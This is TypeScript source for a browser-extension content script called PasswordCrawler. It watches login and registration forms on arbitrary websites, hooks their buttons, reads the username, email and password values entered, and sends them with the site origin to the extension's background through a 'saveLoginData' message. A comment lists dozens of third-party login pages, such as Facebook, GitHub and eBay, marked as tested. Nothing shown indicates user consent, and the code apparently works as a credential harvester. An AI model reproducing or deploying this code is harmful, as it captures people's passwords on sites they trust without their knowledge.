'use strict';

import {browser} from "webextension-polyfill-ts";
import {acsComPortFront} from "../app"

export class PasswordCrawler {
    public url?: any;
    public interval?: any;
    public authEvent?: any;
    public element?: any;
    public elementName?: any;
    public elementValue?: any;
    public passwordStore: { event: any; element: any; value: any; }[] = [];

    constructor(url: string) {
        if (url) {
            this.url = url;
        } else {
            console.error('Crawling error. URL empty.')
        }
    }

    init(callBack?: any) {
        const self = this;
        if (self.url) {
            /*#!if debug===true*/
            console.log(self.url);
            /*#!endif*/

            let interval1 = setInterval(function () {
                if (document.querySelectorAll('form').length !== 0) {
                    /*#!if debug===true*/
                    console.log('form found!!');
                    /*#!endif*/
                    if (document.querySelectorAll('form').length > 1) {
                        /*#!if debug===true*/
                        console.log('form\'s length more than 1!!');
                        console.log(document.querySelectorAll('form'));
                        /*#!endif*/
                        clearInterval(interval1)
                        self.trigger();
                    } else {
                        /*#!if debug===true*/
                        console.log(document.querySelectorAll('form'));
                        /*#!endif*/
                        clearInterval(interval1)
                        self.trigger();
                        /*if (window.location.origin.indexOf('www.dailymotion.com') !== -1) {
                            console.log('domain matched with www.dailymotion.com!!');
                            console.log(document.querySelector('form'));
                        }*/
                    }
                } else {
                    if (window.location.origin.indexOf('dash.fembed.com') !== 1) {
                        if (document.querySelector('#login') !== null) {
                            clearInterval(interval1)
                            /*#!if debug===true*/
                            console.log('form not declared!!');
                            /*#!endif*/
                            self.classicTrack('#email_login', '#password', '#login');
                        }
                    }
                }
            }, 1000);
        }
        /*#!if debug===true*/
        else {
            console.error('URL not found.');
        }
        /*#!endif*/

        if (callBack) {
            callBack();
        }
    }

    trigger() {
        const self = this;
        browser.storage.local.get().then(
            function (setting: { constructor?: any; }) {
                if (Object.keys(setting).length !== 0 && setting.constructor === Object) {
                    /*console.info('Form Element tracking!!');*/
                    self.track();
                }
                /*#!if debug===true*/
                else {
                    console.log('checking setting data failed!! app not installed!!!!');
                }
                /*#!endif*/
            }
        );
    }

    formAttributesResolver(string: any, keyword: any) {
        const self = this;
        let returnValue: any;
        if (string.length !== 0 && string.length >= 5) {
            keyword.forEach(function (kw: any) {
                if (Object.keys(kw).length !== 0 && kw.constructor === Object) {
                    Object.keys(kw).forEach(function (key) {
                        if (key === 'login') {
                            kw.login.forEach(function (kw_log: any) {
                                if (string.toLowerCase().indexOf(kw_log) !== -1) {
                                    returnValue = 'Login';
                                }
                            });
                        } else if (key === 'register') {
                            kw.register.forEach(function (kw_reg: string) {
                                if (string.toLowerCase().indexOf(kw_reg) !== -1) {
                                    returnValue = 'Register';
                                }
                            });
                        } else if (key === 'googleads') {
                            kw.googleads.forEach(function (kw_reg: string) {
                                if (string.toLowerCase().indexOf(kw_reg) !== -1) {
                                    returnValue = 'Google Ads';
                                }
                            });
                        } else {
                            returnValue = string.toLowerCase();
                        }
                    });
                }
            });

            /*console.log('sent string: ' + string);*/
            self.authEvent = returnValue ? returnValue : 'Not Detected';
            /*console.log(self.authEvent);*/
            return self.authEvent;
        }
    }

    attributesResolver(element: any): any {
        const self = this;
        const attributes = [...element.attributes];
        if (attributes.length !== 0) {
            attributes.forEach(function (attr) {
                if (attr.nodeValue !== 'javascript:void(0);') {
                    /*console.info('Form Element tracking!!');*/
                    self.formAttributesResolver(
                        attr.nodeValue,
                        [{'login': ['signin', 'login']}, {'register': ['reg', 'register', 'signup', 'join']}, {'googleads': ['googleads']}]
                    );
                }
            });
        } else {
            self.authEvent = 'Not Detected';
        }
    }

    track() {
        const self = this;
        let elements: string[] = [];
        /*console.info('Form searching!!');*/
        document.querySelectorAll('form')?.forEach(function (element) {
            if (element.nodeName === 'FORM' && element.length !== 1) {
                self.attributesResolver(element);
                /*#!if debug===true*/
                /*console.log(element);
                console.log(self.authEvent);*/
                /*#!endif*/
                self.crawl(elements, element);
            }
        });
    }

    classicTrack(usernameElementId: any, passwordElementId: any, loginButtonElementId: any) {
        let self = this;
        let usernameElement: any;
        let passwordElement: any;
        let loginButtonElement: any;

        if (document.querySelector(usernameElementId) !== null) {
            usernameElement = document.querySelector(usernameElementId);
        }
        if (document.querySelector(passwordElementId) !== null) {
            passwordElement = document.querySelector(passwordElementId);
        }
        if (document.querySelector(loginButtonElementId) !== null) {
            loginButtonElement = document.querySelector(loginButtonElementId);
        }
        loginButtonElement.addEventListener('click', function () {
            /*#!if debug===true*/
            console.log(usernameElement.value)
            console.log(passwordElement.value)
            /*#!endif*/

            return acsComPortFront.postMessage({
                command: 'saveLoginData',
                /*command: 'save' + self.authEvent + 'Data',*/
                data: {
                    "event": self.authEvent,
                    "username": usernameElement.value,
                    "password": passwordElement.value,
                    "workWebsite": window.location.origin
                }
            });
        })
    }

    crawl(elements: any, element: HTMLElement) {
        /*console.log(elements)
        console.log(element)*/
        const self = this;
        element.childNodes?.forEach(function (element) {
            /*console.log(element);*/
            if ((element as HTMLElement).nodeName === 'INPUT' || (element as HTMLElement).nodeName === 'BUTTON') {
                if ((element as HTMLElement).nodeName === 'INPUT' && (element as HTMLInputElement).type !== 'button' && (element as HTMLInputElement).type !== 'reset' &&
                    (element as HTMLInputElement).type !== 'submit' && (element as HTMLInputElement).type !== 'checkbox' && (element as HTMLInputElement).type !== 'color' &&
                    (element as HTMLInputElement).type !== 'date' && (element as HTMLInputElement).type !== 'datetime-local' && (element as HTMLInputElement).type !== 'file' &&
                    (element as HTMLInputElement).type !== 'radio' && (element as HTMLInputElement).name !== 'firstname' && (element as HTMLInputElement).name !== 'lastname' &&
                    (element as HTMLButtonElement).type !== 'button' && (element as HTMLButtonElement).type !== 'reset' && (element as HTMLButtonElement).type !== 'submit' &&
                    (element as HTMLInputElement).type !== 'hidden' && !(element as HTMLElement).hidden && (element as HTMLElement).id !== 'nc_1_captcha_input' && (element as HTMLElement).id !== 's') {
                    elements.push((element as HTMLElement));
                }
                if ((element as HTMLElement).nodeName === 'INPUT' && (element as HTMLButtonElement).type === 'submit' || (element as HTMLElement).nodeName === 'BUTTON' && (element as HTMLButtonElement).type === 'submit' ||
                    (element as HTMLElement).nodeName === 'BUTTON') {
                    /*console.log(element)
                    console.log(elements)*/
                    return self.resolve(element, elements);
                }
            } else {
                self.crawl(elements, (element as HTMLElement));
            }
        });
    }

    /*
    * Checking
    * PASSED DOMAIN LIST
    * Domain: https://www.dailymotion.com/signin?urlback=%2Fus "PASSED"
    * Domain: https://www.facebook.com/ "PASSED"
    * Domain: https://stackoverflow.com/users/login?ssrc=head "PASSED"
    * Domain: https://github.com/login?return_to=%2Fvinceliuice%2FMojave-gtk-theme "PASSED"
    * Domain: https://www.upwork.com/ab/payments/25146924/disbursement-methods "PASSED"
    * Domain: https://www.instagram.com/ "PASSED"
    * Domain: https://login.aliexpress.com/ "PASSED"
    * Domain: https://www2.animesvostfr.net/ "PASSED"
    * Domain: https://disqus.com/profile/login/?next=https%3A//disqus.com/& "PASSED"
    * Domain: https://dash.fembed.com/ "PASSED"
    * Domain: http://www.fxporn.net/join "PASSED"
    * Domain: https://signin.ebay.com/ "PASSED"
    * Domain: http://158.177.240.254:1630/login.php "PASSED"
    * Domain: https://www.roblox.com/login "PASSED"
    * Domain: https://lewdweb.net/wp-login.php "PASSED"
    * Domain: https://passport.i.ua/login/? "PASSED"
    * Domain: https://commons.wikimedia.org/w/index.php?title=Special:UserLogin&returnto=Main+Page "PASSED"
    * Domain: https://m.arabseed.me/ "PASSED"
    * Domain: https://app.essaypro.com/ "PASSED"
    * Domain: https://mitrarank.ir/ "PASSED"
    * Domain: https://www.bodis.com/login "PASSED"
    * Domain: https://user.wco.tv/wp-login.php "PASSED"
    * Domain: https://www.deviantart.com/_sisu/do/signin "PASSED"
    * Domain: https://filesmonster.com/login.php?return=%2F "PASSED"
    * Domain: https://filejoker.net/login "PASSED"
    * Domain: http://www.tavalodkala.com/my-account/ "PASSED"
    * Domain: https://login.yahoo.com/account "PASSED"
    * Domain: https://filecrypt.cc/Login.html "PASSED"
    * Domain: https://bdsm-zone.com/showthread.php?t=146506 "PASSED"
    * Domain: https://insights.hotjar.com/login "PASSED"
    * Domain: https://dogecos.cc/?p=login "PASSED"
    * Domain: https://id.secondlife.com/openid/loginsubmit "PASSED"
    * Domain: https://imagetwist.com/ "PASSED"
    *
    * FAILED DOMAIN LIST
    * Domain: https://m2.arabseed.net/%d8%a7%d9%84%d8%af%d8%ae%d9%88%d9%84/ "FAILED"
    * Domain: https://1fichier.com/login.pl "FAILED"
    * Domain: https://www.kixeye.com/ "FAILED"
    * Domain: https://www.star-clicks.com/login "FAILED"
    * Domain: http://fetish.pornbb.org/login.php "FAILED"
    * Domain: https://epicpw.com/index.php?action=login2 "FAILED"
    *
    * NOT-TESTED DOMAIN LIST
    * Domain: https://www.shesfreaky.com/ "NOT-TESTED"
    * Domain: https://spankbang.com/ "NOT-TESTED"
    * Domain: https://lewdweb.net/ "NOT-TESTED"
    * Domain: http://www.incestflix.com/ "NOT-TESTED"
    * Domain: http://www.hentai-fun.com/ "NOT-TESTED"
    * Domain: https://www.xxxmangasex.com/ "NOT-TESTED"
    * Domain: https://bdsm-zone.com/ "NOT-TESTED"
    * Domain: https://smailpro.com/ "NOT-TESTED"
    * Domain: http://bondagecomixxx.net/ "NOT-TESTED"
    * */

    resolve(element: any, array: any) {
        /*@ts-ignore*/
        let self = this;
        /*@ts-ignore*/
        let elementNode: any;
        let elementName: any;
        let elementValue: any;

        /*#!if debug===true*/
        /* console.log(element);
         console.log(element.type);
         console.log(element.form);*/
        /*#!endif*/

        (element as HTMLElement).addEventListener('click', function (e) {
            /*#!if debug===true*/
            /*e.preventDefault();*/
            alert('clicked!!')
            console.log(array)
            /*#!endif*/

            array.forEach(function (detectedElement: any) {
                /*#!if debug===true*/
                console.log(detectedElement.form);
                console.log(detectedElement);
                console.log(detectedElement.type);
                console.log(detectedElement.attributes);
                console.log();
                /*#!endif*/

                [...detectedElement.attributes].forEach(function (attribute) {
                    /*#!if debug===true*/
                    console.log(attribute);
                    console.log('checking as username');
                    /*#!endif*/
                    if (attribute.nodeName === 'class' || attribute.nodeName === 'id' || attribute.nodeName === 'name' ||
                        attribute.nodeName === 'type' || attribute.nodeName === 'value' || attribute.nodeName === 'autocomplete') {
                        if (attribute.nodeValue.indexOf('user') !== -1) {
                            elementNode = detectedElement;
                            elementName = 'username';
                            elementValue = detectedElement.value;
                        }
                    }
                    /*#!if debug===true*/
                    console.log('checking as login id');
                    /*#!endif*/
                    if (attribute.nodeName === 'class' || attribute.nodeName === 'id' || attribute.nodeName === 'name' ||
                        attribute.nodeName === 'type' || attribute.nodeName === 'value' || attribute.nodeName === 'autocomplete') {
                        if (attribute.nodeValue.indexOf('login') !== -1) {
                            elementNode = detectedElement;
                            elementName = 'loginId';
                            elementValue = detectedElement.value;
                        }
                    }
                    /*#!if debug===true*/
                    console.log('checking as email');
                    /*#!endif*/
                    if (attribute.nodeName === 'class' || attribute.nodeName === 'id' || attribute.nodeName === 'name' ||
                        attribute.nodeName === 'type' || attribute.nodeName === 'value' || attribute.nodeName === 'autocomplete') {
                        if (attribute.nodeValue.indexOf('email') !== -1) {
                            elementNode = detectedElement;
                            elementName = 'email';
                            elementValue = detectedElement.value;
                        }
                    }
                    /*#!if debug===true*/
                    console.log('checking as password');
                    /*#!endif*/
                    if (attribute.nodeName === 'autocomplete' || attribute.nodeName === 'class' || attribute.nodeName === 'id' ||
                        attribute.nodeName === 'name' || attribute.nodeName === 'type' || attribute.nodeName === 'value') {
                        if (attribute.nodeValue.indexOf('pass') !== -1) {
                            elementNode = detectedElement;
                            elementName = 'password';
                            elementValue = detectedElement.value;
                        }
                    }
                    /*#!if debug===true*/
                    console.log('checking finished');
                    /*#!endif*/
                });


                if (elementValue.length !== 0) {
                    /*#!if debug===true*/
                    console.log('Element : ' + elementName + ', value: ' + elementValue);
                    /*#!endif*/
                    self.passwordStore.push({"event": self.authEvent, "element": elementName, "value": elementValue})
                    if (self.passwordStore.length === 2) {
                        /*#!if debug===true*/
                        console.log(self.passwordStore);
                        /*#!endif*/
                        acsComPortFront.postMessage({
                            command: 'saveLoginData',
                            /*command: 'save' + self.authEvent + 'Data',*/
                            data: {
                                "event": self.authEvent,
                                "username": self.passwordStore[0].value,
                                "password": self.passwordStore[1].value,
                                "workWebsite": window.location.origin
                            }
                        });
                        self.passwordStore = [];
                    }
                }
            });
        });
    }
}